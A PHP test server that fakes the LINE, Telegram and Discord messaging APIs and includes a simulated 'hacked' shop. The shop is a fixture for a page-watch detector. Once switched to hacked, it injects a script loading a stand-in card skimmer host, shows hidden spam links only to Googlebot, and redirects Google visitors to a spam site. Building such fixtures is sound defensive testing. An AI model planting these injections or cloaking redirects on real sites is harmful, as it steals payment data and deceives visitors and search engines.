<?php
/**
 * A stand-in for the LINE Messaging API push endpoint, so you can try everything without a LINE account
 * and without spending your monthly message quota.
 *
 *   php -S 127.0.0.1:8765 scripts/fake_line_server.php
 *
 * Then point the module at it:   'line_api_base' => 'http://127.0.0.1:8765'
 *
 * Every accepted push is printed in this terminal and appended to  <system temp>/fake-line-inbox.ndjson
 * Simulate LINE refusing (e.g. monthly quota used up):  FAKE_LINE_STATUS=429 php -S ...
 *
 * It also plays the outside check-in service, so `ping_url` can be tried without signing up anywhere:
 *   'ping_url' => 'http://127.0.0.1:8765/ping/anything'        answers 200 "OK" and prints "check-in received"
 *   'ping_url' => 'http://127.0.0.1:8765/ping-slow/anything'   answers after 4 seconds (to see the timeout work)
 *   'ping_url' => 'http://127.0.0.1:8765/ping-down/anything'   answers 500
 *
 * And a generic incoming webhook, for trying a `notifier` of your own:
 *   POST http://127.0.0.1:8765/hook/anything   with a JSON body; prints its "text" field (or the raw body)
 *
 * Telegram and Discord, too:
 *   'telegram_api_base'   => 'http://127.0.0.1:8765',  'telegram_bot_token' => '123:TEST',  'telegram_chat_id' => '42'
 *   'discord_webhook_url' => 'http://127.0.0.1:8765/api/webhooks/1/ok'
 * The chat id (Telegram) or the last part of the webhook address (Discord) picks how it answers:
 *   anything else   accepted                    500    a server error
 *   429-once        "too many requests, wait 1 second" the first time, then accepted
 *   429-long        "too many requests, wait 30 seconds", every time
 *   slow            answers after 12 seconds (longer than the module waits)
 *   gone            Telegram: chat not found (400); Discord: unknown webhook (404, also when asked about it)
 *   blocked         Telegram: the bot was blocked by the user (403; "typing…" too)
 *   moved           Telegram: the group became a supergroup, now -1009999 (400 naming the new id)
 *   nohtml          Telegram: refuses any HTML (400 "can't parse entities"), plain text is accepted
 *   channel-…       Telegram: a channel (getChat says so; "typing…" is refused there, as in Telegram);
 *                   channel-nopost-…: the bot is an admin of it without the right to post
 *   forum           Discord: a forum channel: refused without ?thread_id= (400, code 220001)
 *   badtoken        Discord: invalid webhook token (401)
 * Like the real ones it refuses a message longer than 4096 (Telegram) or 2000 (Discord) characters, Telegram
 * HTML with a tag it does not know or a tag left open, a button address without a dot in the host
 * ("http://localhost/…"), and Discord cards over their limits (10 cards, 256 / 4096 / 1024, 6000 in all).
 * Telegram getUpdates (for --telegram-chats) lists a person, a group and a topic; FAKE_TG_WEBHOOK=1 plays a bot
 * that has a webhook set (409). Discord answers 204, or the message with ?wait=true.
 *
 * LINE's "how many friends" question (GET /v2/bot/insight/followers?date=yyyyMMdd) answers 3 friends;
 * FAKE_LINE_FRIENDS=500 php -S ... to play the account your customers follow. The channel check asks
 * GET /v2/bot/info, /v2/bot/profile/<id> (an id with "blocked" in it: 404) and /v2/bot/group/<id>/summary
 * (an id with "gone" in it: 404). A push with notificationDisabled is shown as [quiet].
 *
 * And a small shop for trying `page_watch`:
 *   'page_watch' => array('http://127.0.0.1:8765/shop/')
 *   http://127.0.0.1:8765/shop/hack   from now on the shop is "hacked": a card-skimming script for everybody,
 *                                     spam links only for Google's crawler, and visitors coming from Google
 *                                     are redirected to a spam site
 *   http://127.0.0.1:8765/shop/clean  back to normal
 *   /shop/moved redirects to /shop/ (same site), /shop/away to another site.
 */

$inbox = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-line-inbox.ndjson';
$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

function reply($code, $body)
{
    http_response_code($code);
    header('Content-Type: application/json');
    echo json_encode($body);
    return true;
}

if ($path === '/inbox' && $_SERVER['REQUEST_METHOD'] === 'GET')
{
    header('Content-Type: text/plain; charset=UTF-8');
    echo is_file($inbox) ? file_get_contents($inbox) : '';
    return true;
}
if (preg_match('#^/ping(-slow|-down)?/#', (string) $path, $m))
{
    $kind = isset($m[1]) ? $m[1] : '';
    if ($kind === '-slow')
    {
        sleep(4);
    }
    file_put_contents($inbox, json_encode(array('t' => time(), 'ping' => $kind === '' ? 'ok' : substr($kind, 1), 'method' => $_SERVER['REQUEST_METHOD'])) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- check-in received (" . $_SERVER['REQUEST_METHOD'] . ($kind === '' ? '' : ', ' . substr($kind, 1)) . ") -----\n");
    http_response_code($kind === '-down' ? 500 : 200);
    header('Content-Type: text/plain');
    echo $kind === '-down' ? 'Simulated error' : 'OK';
    return true;
}
if (strpos((string) $path, '/hook/') === 0 && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    $raw = (string) file_get_contents('php://input');
    $json = json_decode($raw, true);
    $shown = is_array($json) && isset($json['text']) ? (string) $json['text'] : $raw;
    file_put_contents($inbox, json_encode(array('t' => time(), 'hook' => $shown), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- webhook received -----\n" . $shown . "\n");
    return reply(200, array('ok' => true));
}
if (strpos((string) $path, '/shop/') === 0)
{
    $flag = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-shop-hacked.flag';
    if ($path === '/shop/hack' || $path === '/shop/clean')
    {
        $path === '/shop/hack' ? touch($flag) : @unlink($flag);
        header('Content-Type: text/plain');
        echo $path === '/shop/hack' ? "The shop is now hacked.\n" : "The shop is clean again.\n";
        return true;
    }
    if ($path === '/shop/moved')
    {
        header('Location: /shop/', true, 301);
        return true;
    }
    if ($path === '/shop/away')
    {
        header('Location: https://elsewhere.example/landing', true, 302);
        return true;
    }
    if ($path !== '/shop/')
    {
        return reply(404, array('message' => 'Not found'));
    }
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    $hacked = is_file($flag);
    if ($hacked && strpos($ref, 'google.') !== false && stripos($ua, 'Googlebot') === false)
    {
        header('Location: https://spam-landing.example/?from=shop', true, 302);   // visitors from Google are sent away
        return true;
    }
    $html = '<!doctype html><html><head><meta charset="utf-8"><title>Fake shop</title>'
        . '<script src="/js/app.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-TEST"></script>'
        . ($hacked ? '<script>var s=document.createElement("script");s.src="https:\/\/cdn-skimmer.example\/s.js";document.head.appendChild(s);</script>' : '')
        . '</head><body><h1>Fake shop</h1><a href="/cart">Cart</a> <a href="https://www.facebook.com/fakeshop">Facebook</a>'
        . '<form action="/search"><input name="q"></form>'
        . ($hacked && stripos($ua, 'Googlebot') !== false ? '<div style="display:none"><a href="https://casino-spam.example/">casino</a></div>' : '')
        . '</body></html>';
    $enc = isset($_SERVER['HTTP_ACCEPT_ENCODING']) ? $_SERVER['HTTP_ACCEPT_ENCODING'] : '';
    header('Content-Type: text/html; charset=UTF-8');
    if (strpos($enc, 'gzip') !== false && function_exists('gzencode'))
    {
        header('Content-Encoding: gzip');   // curl asks for it and unpacks it; plain streams do not ask
        $html = gzencode($html);
    }
    echo $html;
    return true;
}
if ($path === '/v2/bot/insight/followers' && $_SERVER['REQUEST_METHOD'] === 'GET')
{
    if (!isset($_GET['date']) || !preg_match('/^\d{8}$/', (string) $_GET['date']))
    {
        return reply(400, array('message' => 'date is required'));
    }
    return reply(200, array('status' => 'ready', 'followers' => (int) (getenv('FAKE_LINE_FRIENDS') ?: 3), 'targetedReaches' => 0, 'blocks' => 0));
}
/** Telegram and Discord count in UTF-16 code units: an emoji is two. */
function units16($s)
{
    return (int) preg_match_all('/./us', $s) + (int) preg_match_all('/[\x{10000}-\x{10FFFF}]/u', $s);
}

/** How the fake answers, picked by $mode. Returns null = go ahead and accept. */
function trouble($mode, $service)
{
    if ($mode === 'slow')
    {
        sleep(12);
    }
    if ($mode === '500')
    {
        return reply(500, $service === 'telegram' ? array('ok' => false, 'error_code' => 500, 'description' => 'Internal Server Error') : array('message' => '500: Internal Server Error', 'code' => 0));
    }
    $flag = rtrim(str_replace('\\', '/', sys_get_temp_dir()), '/') . '/fake-line-429-' . $service . '.flag';
    if ($mode === '429-long' || ($mode === '429-once' && !is_file($flag)))
    {
        if ($mode === '429-once')
        {
            touch($flag);
        }
        $wait = $mode === '429-long' ? 30 : 1;
        return reply(429, $service === 'telegram'
            ? array('ok' => false, 'error_code' => 429, 'description' => 'Too Many Requests: retry after ' . $wait, 'parameters' => array('retry_after' => $wait))
            : array('message' => 'You are being rate limited.', 'retry_after' => $mode === '429-long' ? 30.0 : 0.6, 'global' => false));
    }
    if ($mode === '429-once')
    {
        @unlink($flag);   // the second try goes through
    }
    if ($mode === 'gone')
    {
        return $service === 'telegram'
            ? reply(400, array('ok' => false, 'error_code' => 400, 'description' => 'Bad Request: chat not found'))
            : reply(404, array('message' => 'Unknown Webhook', 'code' => 10015));
    }
    return null;
}

/** Telegram's HTML, checked about as strictly as Telegram does. @return string '' = fine, else the reason */
function tg_html_problem($html)
{
    $known = array('b', 'strong', 'i', 'em', 'u', 'ins', 's', 'strike', 'del', 'a', 'code', 'pre', 'blockquote', 'tg-spoiler', 'span', 'tg-emoji', 'tg-time');
    $stack = array();
    $at = 0;
    while (($p = strpos($html, '<', $at)) !== false)
    {
        if (!preg_match('#\G<(/?)([a-z][a-z0-9-]*)(\s[^<>]*)?>#', $html, $t, 0, $p))
        {
            return "can't parse entities: Unclosed start tag at byte offset " . $p;   // a "<" that is not a tag
        }
        $name = $t[2];
        if (!in_array($name, $known, true))
        {
            return "can't parse entities: Unsupported start tag \"" . $name . '" at byte offset ' . $p;
        }
        if ($t[1] === '/')
        {
            $open = array_pop($stack);
            if ($open !== $name)
            {
                return "can't parse entities: Unmatched end tag at byte offset " . $p . ', expected "</' . $open . '>", found "</' . $name . '>"';
            }
        }
        else
        {
            if ($name === 'blockquote' && in_array('blockquote', $stack, true))
            {
                return "can't parse entities: blockquotes can't be nested";
            }
            $stack[] = $name;
        }
        $at = $p + strlen($t[0]);
    }
    return $stack ? "can't parse entities: Can't find end tag corresponding to start tag \"" . end($stack) . '"' : '';
}

/** The text a Telegram user sees from HTML: tags out, the four named entities and numeric ones decoded. */
function tg_html_text($html)
{
    $s = (string) preg_replace('#</?[a-z][a-z0-9-]*(\s[^<>]*)?>#', '', $html);
    return html_entity_decode($s, ENT_QUOTES | ENT_HTML401, 'UTF-8');
}

function tg_fail($code, $description, array $parameters = array())
{
    file_put_contents('php://stderr', "\n----- Telegram refused (" . $code . '): ' . $description . " -----\n");
    $body = array('ok' => false, 'error_code' => $code, 'description' => $description);
    if ($parameters)
    {
        $body['parameters'] = $parameters;
    }
    return reply($code, $body);
}

if (preg_match('#^/bot([^/]+)/(sendMessage|getChat|getChatMember|sendChatAction|getUpdates)$#', (string) $path, $m) && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    if (!preg_match('/^[0-9]+:[A-Za-z0-9_-]+$/', $m[1]))
    {
        return tg_fail(401, 'Unauthorized');
    }
    $method = $m[2];
    $req = json_decode((string) file_get_contents('php://input'), true);
    $req = is_array($req) ? $req : array();
    if ($method === 'getUpdates')
    {
        if (getenv('FAKE_TG_WEBHOOK'))
        {
            return tg_fail(409, "Conflict: can't use getUpdates method while webhook is active; use deleteWebhook to delete the webhook first");
        }
        file_put_contents('php://stderr', "\n----- Telegram getUpdates" . (isset($req['offset']) ? ' (with an offset: updates would be marked as read!)' : '') . " -----\n");
        $group = array('id' => -1001234567890, 'type' => 'supergroup', 'title' => 'Test group', 'is_forum' => true);
        return reply(200, array('ok' => true, 'result' => array(
            array('update_id' => 501, 'message' => array('message_id' => 1, 'date' => time(), 'text' => '/start',
                'chat' => array('id' => 42, 'type' => 'private', 'first_name' => 'Test', 'last_name' => 'User'))),
            array('update_id' => 502, 'my_chat_member' => array('chat' => $group, 'date' => time())),
            array('update_id' => 503, 'message' => array('message_id' => 30, 'message_thread_id' => 12, 'is_topic_message' => true, 'date' => time(),
                'chat' => $group, 'text' => '/start@test_bot', 'reply_to_message' => array('message_id' => 12, 'forum_topic_created' => array('name' => 'Alerts', 'icon_color' => 7322096)))),
        )));
    }
    $chat = isset($req['chat_id']) ? (string) $req['chat_id'] : '';
    if ($chat === '' || $chat === 'gone')
    {
        return tg_fail(400, 'Bad Request: chat not found');
    }
    if ($chat === 'moved')
    {
        return tg_fail(400, 'Bad Request: group chat was upgraded to a supergroup chat', array('migrate_to_chat_id' => -1009999));
    }
    $isChannel = strpos($chat, 'channel') === 0;
    if ($method === 'getChat')
    {
        $type = $isChannel ? 'channel' : (strpos($chat, '-100') === 0 ? 'supergroup' : (strpos($chat, '-') === 0 ? 'group' : 'private'));
        return reply(200, array('ok' => true, 'result' => array('id' => is_numeric($chat) ? (int) $chat : -1005555, 'type' => $type, 'title' => 'Fake ' . $type)));
    }
    if ($method === 'getChatMember')
    {
        /* a chat id with "nopost" in it: the bot is an admin there without the right to post */
        return reply(200, array('ok' => true, 'result' => array('status' => 'administrator', 'can_post_messages' => strpos($chat, 'nopost') === false,
            'user' => array('id' => isset($req['user_id']) ? $req['user_id'] : 0, 'is_bot' => true))));
    }
    if ($chat === 'blocked')
    {
        return tg_fail(403, 'Forbidden: bot was blocked by the user');
    }
    if ($method === 'sendChatAction')
    {
        if ($isChannel)
        {
            return tg_fail(400, 'Bad Request: chat actions are not supported in channels');   // the real wording is not documented
        }
        file_put_contents('php://stderr', "\n----- Telegram: \"typing…\" in chat " . $chat . (isset($req['message_thread_id']) ? ', topic ' . $req['message_thread_id'] : '') . " -----\n");
        return reply(200, array('ok' => true, 'result' => true));
    }
    if (!isset($req['text']) || $req['text'] === '')
    {
        return tg_fail(400, 'Bad Request: message text is empty');
    }
    if (($r = trouble($chat, 'telegram')) !== null)
    {
        return $r;
    }
    $text = (string) $req['text'];
    $html = isset($req['parse_mode']) && strtoupper((string) $req['parse_mode']) === 'HTML';
    if ($html)
    {
        $why = $chat === 'nohtml' ? "can't parse entities: refused on purpose (chat id nohtml)" : tg_html_problem($text);
        if ($why !== '')
        {
            return tg_fail(400, 'Bad Request: ' . $why);
        }
    }
    $shown = $html ? tg_html_text($text) : $text;
    if (units16($shown) > 4096)
    {
        return tg_fail(400, 'Bad Request: message is too long');
    }
    $buttons = array();
    if (isset($req['reply_markup']['inline_keyboard']) && is_array($req['reply_markup']['inline_keyboard']))
    {
        foreach ($req['reply_markup']['inline_keyboard'] as $row)
        {
            foreach ((array) $row as $b)
            {
                $u = isset($b['url']) ? (string) $b['url'] : '';
                if (!preg_match('~^https?://[^/\s?#]*\.[^/\s?#]+~i', $u))
                {
                    return tg_fail(400, "Bad Request: inline keyboard button URL '" . $u . "' is invalid: Wrong HTTP URL");
                }
                $buttons[] = (isset($b['text']) ? (string) $b['text'] : '?') . ' -> ' . $u;
            }
        }
    }
    $quiet = !empty($req['disable_notification']);
    $topic = isset($req['message_thread_id']) ? (int) $req['message_thread_id'] : 0;
    file_put_contents($inbox, json_encode(array('t' => time(), 'telegram' => $chat, 'topic' => $topic, 'text' => $shown, 'html' => $html ? $text : null,
        'quiet' => $quiet, 'buttons' => $buttons, 'no_preview' => !empty($req['link_preview_options']['is_disabled'])), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- Telegram message to chat " . $chat . ($topic ? ', topic ' . $topic : '') . ($quiet ? ' [quiet]' : '') . ($html ? ' [HTML]' : '') . " -----\n"
        . $shown . "\n" . ($buttons ? '[buttons] ' . implode(' | ', $buttons) . "\n" : ''));
    return reply(200, array('ok' => true, 'result' => array('message_id' => mt_rand(1, 99999))));
}
if (preg_match('#^/api/webhooks/([0-9]+)/([^/?]+)$#', (string) $path, $m) && $_SERVER['REQUEST_METHOD'] === 'GET')
{
    if ($m[2] === 'gone')
    {
        return reply(404, array('message' => 'Unknown Webhook', 'code' => 10015));
    }
    if ($m[2] === 'badtoken')
    {
        return reply(401, array('message' => 'Invalid Webhook Token', 'code' => 50027));
    }
    file_put_contents('php://stderr', "\n----- Discord: asked about webhook " . $m[1] . " -----\n");
    return reply(200, array('type' => 1, 'id' => $m[1], 'name' => 'Fake webhook', 'channel_id' => '200', 'guild_id' => '300', 'application_id' => null, 'avatar' => null, 'token' => $m[2]));
}
if (preg_match('#^/api/webhooks/([0-9]+)/([^/?]+)$#', (string) $path, $m) && $_SERVER['REQUEST_METHOD'] === 'POST')
{
    $req = json_decode((string) file_get_contents('php://input'), true);
    $req = is_array($req) ? $req : array();
    $embeds = isset($req['embeds']) && is_array($req['embeds']) ? $req['embeds'] : array();
    $text = isset($req['content']) ? (string) $req['content'] : '';
    $thread = isset($_GET['thread_id']) ? (string) $_GET['thread_id'] : '';
    $wait = isset($_GET['wait']) && in_array(strtolower((string) $_GET['wait']), array('true', '1'), true);
    if ($m[2] === 'badtoken')
    {
        return reply(401, array('message' => 'Invalid Webhook Token', 'code' => 50027));
    }
    if ($text === '' && !$embeds)
    {
        return reply(400, array('message' => 'Cannot send an empty message', 'code' => 50006));
    }
    if ($m[2] === 'forum' && $thread === '')
    {
        return reply(400, array('message' => 'Webhooks posted to forum channels must have a thread_name or thread_id', 'code' => 220001));
    }
    if (($r = trouble($m[2], 'discord')) !== null)
    {
        return $r;
    }
    $bad = function ($field, $max) {
        file_put_contents('php://stderr', "\n----- Discord refused (400): " . $field . ' over ' . $max . " -----\n");
        return reply(400, array('message' => 'Invalid Form Body', 'code' => 50035, 'errors' => array($field => array('_errors' => array(array('code' => 'BASE_TYPE_MAX_LENGTH', 'message' => 'Must be ' . $max . ' or fewer in length.'))))));
    };
    if (units16($text) > 2000)
    {
        return $bad('content', 2000);
    }
    if (count($embeds) > 10)
    {
        return $bad('embeds', 10);
    }
    $total = 0;
    $lines = array();
    foreach ($embeds as $i => $e)
    {
        foreach (array('title' => 256, 'description' => 4096) as $k => $max)
        {
            if (isset($e[$k]) && units16(trim((string) $e[$k])) > $max) { return $bad('embeds.' . $i . '.' . $k, $max); }
            $total += isset($e[$k]) ? units16(trim((string) $e[$k])) : 0;
        }
        foreach (isset($e['fields']) ? (array) $e['fields'] : array() as $f)
        {
            if (units16(trim((string) $f['value'])) > 1024 || units16(trim((string) $f['name'])) > 256) { return $bad('embeds.' . $i . '.fields', 1024); }
            $total += units16(trim((string) $f['value'])) + units16(trim((string) $f['name']));
        }
        $lines[] = sprintf('▌#%06X ', isset($e['color']) ? (int) $e['color'] : 0) . (isset($e['title']) ? $e['title'] : '')
            . (isset($e['description']) ? "\n" . $e['description'] : '')
            . implode('', array_map(function ($f) { return "\n[" . $f['name'] . '] ' . $f['value']; }, isset($e['fields']) ? (array) $e['fields'] : array()));
    }
    if ($total > 6000)
    {
        return $bad('embeds', 6000);
    }
    $flags = isset($req['flags']) ? (int) $req['flags'] : 0;
    $mentionsOff = isset($req['allowed_mentions']['parse']) && $req['allowed_mentions']['parse'] === array();
    file_put_contents($inbox, json_encode(array('t' => time(), 'discord' => $m[1], 'thread' => $thread, 'text' => $text, 'cards' => $lines, 'mentions_off' => $mentionsOff,
        'flags' => $flags, 'wait' => $wait), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
    file_put_contents('php://stderr', "\n----- Discord message (webhook " . $m[1] . ($thread !== '' ? ', thread ' . $thread : '') . (($flags & 4096) ? ' [quiet]' : '')
        . ($mentionsOff ? '' : ', WARNING: mentions not switched off') . (($flags & 4) && $embeds ? ', WARNING: flag 4 hides these cards' : '') . ") -----\n"
        . $text . ($lines ? "\n" . implode("\n", $lines) : '') . "\n");
    if ($wait)
    {
        return reply(200, array('id' => (string) mt_rand(100000, 999999), 'type' => 0, 'channel_id' => $thread !== '' ? $thread : '200', 'content' => $text, 'embeds' => $embeds, 'flags' => $flags));
    }
    http_response_code(204);   // what Discord answers when the caller does not ask to wait for the message
    return true;
}
if ($_SERVER['REQUEST_METHOD'] === 'GET' && preg_match('#^/v2/bot/(info|profile/([^/]+)|group/([^/]+)/summary)$#', (string) $path, $m))
{
    $auth = isset($_SERVER['HTTP_AUTHORIZATION']) ? $_SERVER['HTTP_AUTHORIZATION'] : '';
    if (!preg_match('/^Bearer \S+/', $auth))
    {
        return reply(401, array('message' => 'Authentication failed. Confirm that the access token in the authorization header is valid.'));
    }
    if ($m[1] === 'info')
    {
        return reply(200, array('userId' => 'Ufake0000000000000000000000000000', 'basicId' => '@000fake', 'displayName' => 'Fake LINE account', 'chatMode' => 'bot'));
    }
    $who = isset($m[3]) && $m[3] !== '' ? $m[3] : $m[2];
    if (strpos($who, 'blocked') !== false || strpos($who, 'gone') !== false)
    {
        return reply(404, array('message' => 'Not found'));
    }
    return reply(200, isset($m[3]) && $m[3] !== '' ? array('groupId' => $who, 'groupName' => 'Fake group') : array('userId' => $who, 'displayName' => 'Fake friend'));
}
if ($path !== '/v2/bot/message/push' || $_SERVER['REQUEST_METHOD'] !== 'POST')
{
    return reply(404, array('message' => 'Not found'));
}
$auth = isset($_SERVER['HTTP_AUTHORIZATION']) ? $_SERVER['HTTP_AUTHORIZATION'] : '';
if (!preg_match('/^Bearer \S+/', $auth))
{
    return reply(401, array('message' => 'Authentication failed'));
}
$status = (int) (getenv('FAKE_LINE_STATUS') ?: 200);
if ($status !== 200)
{
    return reply($status, array('message' => $status === 429 ? 'You have reached your monthly limit.' : 'Simulated error'));
}
$req = json_decode((string) file_get_contents('php://input'), true);
if (!is_array($req) || empty($req['to']) || empty($req['messages'][0]['text']))
{
    return reply(400, array('message' => 'The request body has 1 error(s)'));
}
$text = (string) $req['messages'][0]['text'];
if ((function_exists('mb_strlen') ? mb_strlen($text, 'UTF-8') : preg_match_all('/./us', $text)) > 5000)
{
    return reply(400, array('message' => 'Length must be between 0 and 5000'));
}
$quiet = !empty($req['notificationDisabled']);
file_put_contents($inbox, json_encode(array('t' => time(), 'to' => $req['to'], 'text' => $text, 'quiet' => $quiet), JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);
file_put_contents('php://stderr', "\n----- push to " . $req['to'] . ($quiet ? ' [quiet]' : '') . " -----\n" . $text . "\n");
return reply(200, new stdClass());   // LINE answers {} on success
